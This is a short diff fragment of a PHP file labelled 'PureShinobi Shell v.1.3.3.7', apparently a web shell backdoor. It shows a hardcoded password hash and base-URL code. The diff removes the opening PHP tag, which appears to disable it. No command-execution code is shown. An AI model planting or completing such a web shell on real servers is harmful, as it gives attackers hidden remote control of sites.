@@ -1,4 +1,4 @@
-<?php
+ 
 /*	PureShinobi Shell v.1.3.3.7 */
 $s_pass = "dce0b27ba675df41e9cc07af80ec59c475810824"; 
 $base_url = ( isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']=='on' ? 'https' : 'http' ) . '://' .  $_SERVER['HTTP_HOST'];
